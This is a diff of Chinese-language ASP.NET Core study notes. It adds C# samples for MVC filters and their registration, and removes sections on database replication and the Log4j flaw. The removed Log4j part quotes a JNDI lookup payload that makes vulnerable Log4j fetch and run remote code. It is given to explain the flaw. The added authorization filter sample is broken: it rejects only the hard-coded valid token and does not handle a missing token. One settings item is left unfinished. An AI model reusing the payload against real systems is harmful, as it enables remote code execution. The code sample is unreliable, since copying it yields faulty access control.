@@ -3024,9 +3024,339 @@ public class HomeController : Controller
 
   
 
+## Filter
+
+- ##### Filter可以在進入 Action 與離開 Action 時對 Requset 進行檢查或加工。而將部分檢查放在 Filter 中，除了可以將部分重複的邏輯抽離出來，也可以透過不同種類 Filter 來增加檢查的精確性。
+
+- ##### Middleware 只能存取 HttpContext，而 Filter 可以存取整個 MVC context，所以 Filter 可以存取 Routing data 和 model binding 的資訊。
+
+- ![img](https://miro.medium.com/v2/resize:fit:425/1*p78ahSmAmZZk4dTm2jyOhg.png)
+
+###  Authorization filters
+
+- ##### 檢查使用者是否有授權，若無授權在此階段就可先擋下，擋下後將不再執行之後的流程。
+
+- ##### 以 cookie 中帶 token 傳入驗證為例，若 token 驗證不過則回傳 401 未授權
+
+  - ```c#
+    public class AuthorizationFilter : IAsyncAuthorizationFilter
+    {
+        public async Task OnAuthorizationAsync(AuthorizationFilterContext context)
+        {
+            var cookies = context.HttpContext.Request.Cookies;
+    
+            cookies.TryGetValue("token", out string token);
+    
+            if (token.Equals("123456"))
+            {
+                var response = new FailResultViewModel
+                {
+                    CorrelationId = Guid.NewGuid().ToString(),
+                    Method = $"{context.HttpContext.Request.Path}.{context.HttpContext.Request.Method}",
+                    Status = "UnAuthorized",
+                    Version = "1.0",
+                    Error = new FailInformation()
+                    {
+                        Domain = "ProjectName",
+                        Message = "未授權",
+                        Description = "授權驗證失敗"
+                    }
+                };
+    
+                context.Result = new ObjectResult(response)
+                {
+                    // 401
+                    StatusCode = (int)HttpStatusCode.Unauthorized
+                };
+            }
+        }
+    }
+    ```
+
+  
+
+### Resource filters
+
+- #####  Authorization Filter 後，Model Binding 前執行，以及 Pipeline 中其餘部分都完成後執行。
+
+- ##### 用來處理快取或 Model Binding，如果 Cache 中已經有需要的值那就不需要再繼續執行剩下的步驟了，也可以限制檔案上傳大小等等。
+
+- ##### 以 Cahce 為例，當傳入相同的 Request 時直接從 Cache 回傳結果
+
+  - ```C#
+    public class CacheResourceFilter : IAsyncResourceFilter
+    {
+        private static readonly Dictionary<string, ObjectResult> _cache = new Dictionary<string, ObjectResult>();
+    
+        public async Task OnResourceExecutionAsync(ResourceExecutingContext context, ResourceExecutionDelegate next)
+        {
+            var cacheKey = context.HttpContext.Request.Path.ToString();
+    
+            if (_cache != null && _cache.ContainsKey(cacheKey))
+            {
+                var cacheValue = _cache[cacheKey];
+                if (cacheValue != null)
+                {
+                    context.Result = cacheValue;
+                }
+            }
+            else
+            {
+                var executedContext = await next();
+    
+                var result = executedContext.Result as ObjectResult;
+                if (result != null)
+                {
+                    _cache.Add(cacheKey, result);
+                }
+            }
+        }
+    }
+    ```
+
+    
+
+### Action filters
+
+- ##### 跟Resource Filters 的差異主要在於進出時機的不同，可以在執行Action前或Action執行後進行檢查。
+
+- ##### 對執行前傳入的參數檢查，若檢查未通過則回傳參數驗證失敗
+
+  - ```C#
+    public class ValidationActionFilter : IAsyncActionFilter, IOrderedFilter
+    {
+        public int Order { get; set; } = 0;
+        public async Task OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next)
+        {
+            var parameter = context.ActionArguments.SingleOrDefault();
+            if (parameter.Value is null)
+            {
+                var response = new FailResultViewModel
+                {
+                    CorrelationId = Guid.NewGuid().ToString(),
+                    Method = $"{context.HttpContext.Request.Path}.{context.HttpContext.Request.Method}",
+                    Status = "Error",
+                    Version = "1.0",
+                    Error = new FailInformation
+                    {
+                        Domain = "ProjectName",
+                        Message = "參數驗證失敗",
+                        Description = "傳入參數為null"
+                    }
+                };
+    
+                context.Result = new ObjectResult(response)
+                {
+                    // 400
+                    StatusCode = (int)HttpStatusCode.BadRequest
+                };
+            }
+            else
+            {
+                await next();
+            }
+        }
+    }
+    ```
+
+- #####  將執行後的結果再包裝成特定格式後回傳
+
+  - ```C#
+    public class MessageActionFilter : IAsyncActionFilter, IOrderedFilter
+    {
+        public int Order { get; set; } = 0;
+        public async Task OnActionExecutionAsync(ActionExecutingContext context, ActionExecutionDelegate next)
+        {
+            var executedContext = await next();
+    
+            var result = executedContext.Result as ObjectResult;
+            
+            if (result != null
+             && !(result.Value is HttpResponseMessage)
+             && !(result.Value is SuccessResultViewModel<object>)
+             && !(result.Value is FailResultViewModel)
+             && !(result.Value is SuccessResultViewModel<ModelStateDictionary>))
+            {
+                var responseModel = new SuccessResultViewModel<object>
+                {
+                    Version = "1.0",
+                    Method = $"{context.HttpContext.Request.Path}.{context.HttpContext.Request.Method}",
+                    Status = "Success",
+                    CorrelationId = Guid.NewGuid().ToString(),
+                    Data = result.Value
+                };
+    
+                executedContext.Result = new ObjectResult(responseModel)
+                {
+                    // 200
+                    StatusCode = (int)HttpStatusCode.OK
+                };
+            }
+        }
+    }
+    ```
+
+    
+
+### Exception filters
+
+- ##### 發生 Exception 後會進入的 Filter。
+
+- ##### 針對 Action 拋出的例外狀況進行攔截並包裝成特定格式後回傳
+
+  - ```C#
+    public class ExceptionFilter : IAsyncExceptionFilter
+    {
+        public Task OnExceptionAsync(ExceptionContext context)
+        {
+            var response = new FailResultViewModel
+            {
+                CorrelationId = Guid.NewGuid().ToString(),
+                Method = $"{context.HttpContext.Request.Path}.{context.HttpContext.Request.Method}",
+                Status = "Error",
+                Version = "1.0",
+                Error = new FailInformation
+                {
+                    Domain = "ProjectName",
+                    ErrorCode = 40000,
+                    Message = context.Exception.Message,
+                    Description = context.Exception.ToString()
+                }
+            };
+    
+            context.Result = new ObjectResult(response)
+            {
+                // 500
+                StatusCode = (int)HttpStatusCode.InternalServerError
+            };
+    
+            // Exceptinon Filter只在ExceptionHandled=false時觸發
+            // 所以處理完Exception要標記true表示已處理
+            context.ExceptionHandled = true;
+    
+            return Task.CompletedTask;
+        }
+    }
+    ```
+
+###  Result filters
+
+- ##### Action 執行完畢後執行，若是在 Action 中發生 Exception 則不會經過這個Filter。
+
+- ##### 將訊息加入 Header 回傳
+
+  - ```C#
+    public class ResultFilter : IAsyncResultFilter
+    {
+        public async Task OnResultExecutionAsync(ResultExecutingContext context, ResultExecutionDelegate next)
+        {
+            if (!(context.Result is EmptyResult))
+            {
+                var headerName = "OnResultExecuting";
+    
+                var headerValue = new string[] { "ResultExecuting Successfully" };
+    
+                context.HttpContext.Response.Headers.Add(headerName, headerValue);
+    
+                await next();
+    
+                // 無法在執行後加入 Header，因為 Response 已經開始，此時 Response 可能已經到 Client 端那便無法修改了
+            }
+            else
+            {
+                // 若已經被其他 Filter 攔截回傳或是接收到的 context 是空的，則取消 Result 回傳
+                // 但是若提前被攔截則並不會進到 ResultFilter
+                context.Cancel = true;
+            }
+        }
+    }
+    ```
+
+    
+
+### 全域註冊
+
+- ##### 全域註冊的方式所註冊的Filters將會被套用到所有的Request，若 Filter 中有透過DI容器注入服務的話，透過全域註冊的方式其相依性會由DI容器滿足。
+
+- ```C#
+  public static class FilterExtensions
+  {
+      /// <summary>
+      /// Adds the message filter.
+      /// </summary>
+      /// <param name="options">The options.</param>
+      public static void AddMessageFilter(this MvcOptions options)
+      {
+          options.Filters.Add<AuthorizationFilter>();
+          options.Filters.Add<CacheResourceFilter>();
+          options.Filters.Add<ExceptionFilter>();
+          options.Filters.Add(new ValidationActionFilter() { Order = 0 });
+          options.Filters.Add(new MessageActionFilter() { Order = 1 });
+          options.Filters.Add<ResultFilter>();
+      }
+  }
+  ```
+
+### 區域註冊
+
+- ##### 透過 TypeFilterAttribute 進行註冊。在 Controller 或 Action 上加上 [TypeFilter(typeof(YourFilter)] 的方式進行區域註冊。
+
+- ##### TypeFilterAttribute 參考的類型不需要向DI容器註冊，但所參考的類型中的相依性會由DI容器滿足，若是在 Filter 中透過DI容器注入服務，用此註冊方式可以正常的執行。
+
+- ```C#
+  [TypeFilter(typeof(ActionFilter))]
+  [HttpGet("test")]
+  public async Task<IActionResult> Test()
+  {
+      return Ok();
+  }
+  ```
+
+### 透過Attribute註冊
+
+- ##### Filter 也可以透過繼承 Attribute的方式讓自己可以作為附加屬性執行。
+
+- ##### 透過繼承 Attribute的方式來使用的 Filter中的相依性不會透過 DI 容器滿足，故若在 Filter 中有透過 DI 容器注入服務的話，還是要透過另外兩種註冊方式才能正常運行。
+
+- ```C#
+  using Microsoft.AspNetCore.Http;
+  using Microsoft.AspNetCore.Mvc.Filters;
+  using System;
+  
+  namespace FilterTest.Infars.Filters
+  {
+      public class ActionFilter : Attribute, IActionFilter
+      {
+          public void OnActionExecuting(ActionExecutingContext context)
+          {
+              //Action 執行前執行
+              context.HttpContext.Response.WriteAsync($"進入Action Filter。 \r\n");
+          }
+  
+          public void OnActionExecuted(ActionExecutedContext context)
+          {
+              //Action 執行後執行
+              context.HttpContext.Response.WriteAsync($"離開 Action Filter。 \r\n");
+          }
+      }
+  }
+  
+  //-------------------------------------------------------------------------------------
+   [ActionFilter]
+  [HttpGet("test")]
+  public async Task<IActionResult> Test()
+  {
+      return Ok();
+  }
+  ```
+
+  
 
 
-## appsettings.json
+
+
+
+## Appsettings.json
 
 1. 若執行環境為 *Production* ，只讀 *appsettings.json* 。
 
@@ -3036,6 +3366,8 @@ public class HomeController : Controller
 
    - *launchSettings.json* 內 **ASPNETCORE_ENVIRONMENT**值
    - 如果沒有指定 ASPNETCORE_ENVIRONMENT 環境變數，則預設的執行環境是 *Production* 
+
+4. 將Settings內的
 
 
 
@@ -3389,35 +3721,7 @@ public class HomeController : Controller
       FETCH NEXT 1 ROWS ONLY;/****取一筆，若沒使用Fetch Next 則取全部 ***/
     ```
 
-### Master Slave Replication
-
-- ##### **主從式架構**：將資料庫的 server 區分成 Master(1台) 與 Slave(N台) 兩種，Master 負責資料寫入，Slave 提供資料檢索；這樣就把壓力分散到幾台 Server 上面。
-
-- ##### **資料庫同步**：Slave 會同步 Master 的資料，這樣除了分散 server 壓力外，資料也獲得了備份。
-
-- ##### 同步方式
-
-  - ###### 在 master 的 server 執行的 SQL command 會被記錄在 Binary Log 裡面
-
-  - ###### master 將 Binary Log 傳送到 slave 的 Relay Log
-
-  - ###### slave 依據 Relay Log 做資料的變更
-
-  - ![img](https://miro.medium.com/max/1400/1*WlxDWYwxwlj3-k_yVumyOg.png)
-
-### 參考
-
-- [MySQL Master Slave Replication 主從式架構設定教學](https://medium.com/dean-lin/16d0a0fa1d04)
-
-
-
-##  Log4j 資安漏洞
-
-- ###### 這次出問題的套件就是 Log4j，而出問題的原因跟我開頭講的一樣，有一個鮮為人知的功能有著安全性的漏洞，只要 Log4j 在記錄 log 時記錄到某個特定格式的東西，就會去執行相對應的程式碼。
-
-- `${jndi:ldap://cymetrics.io/test}`
-
-  - ###### 當 Log4j 紀錄上面那一串字的時候，它發現這串字符合特定格式，就會去裡面的網址（cymetrics.io/test）下載程式碼然後執行，因此這是一個 RCE（Remote Code Execution，遠端程式碼執行）漏洞。
+###### 
 
 ## 高併發處理
 
